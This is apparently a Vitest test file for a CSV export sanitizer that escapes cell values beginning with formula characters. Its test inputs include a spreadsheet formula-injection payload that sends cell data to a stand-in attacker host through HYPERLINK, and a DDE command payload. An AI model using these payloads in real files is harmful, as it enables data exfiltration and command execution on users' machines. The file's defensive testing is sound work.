import { describe, expect, it } from "vitest";
import { objectsToCsv, sanitizeValue } from "./csvUtils";

describe("sanitizeValue", () => {
  it.each([
    ['=HYPERLINK("https://evil.example/?d="&A1,"x")', `"'=HYPERLINK(""https://evil.example/?d=""&A1,""x"")"`],
    ["=1+1", "'=1+1"],
    ["+33600000000", "'+33600000000"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1:A2)", "'@SUM(A1:A2)"],
    ["\t=1+1", "'\t=1+1"],
    ["\r=1+1", `"'\r=1+1"`],
  ])("neutralizes the formula-leading value %j", (value, expected) => {
    expect(sanitizeValue(value)).toBe(expected);
  });

  it("leaves a formula character in the middle of a value alone", () => {
    expect(sanitizeValue("a=b")).toBe("a=b");
    expect(sanitizeValue("jane@example.com")).toBe("jane@example.com");
  });

  it("still quotes commas, quotes and newlines", () => {
    expect(sanitizeValue("a,b")).toBe('"a,b"');
    expect(sanitizeValue('say "hi"')).toBe('"say ""hi"""');
    expect(sanitizeValue("line1\nline2")).toBe('"line1\nline2"');
    expect(sanitizeValue("plain text")).toBe("plain text");
  });
});

describe("objectsToCsv", () => {
  it("does not let a booker-typed name start a cell with a formula", () => {
    const csv = objectsToCsv([{ attendee_name: "=cmd|' /C calc'!A0", title: "Meeting" }]);

    expect(csv).toBe(`attendee_name,title\n'=cmd|' /C calc'!A0,Meeting`);
  });
});
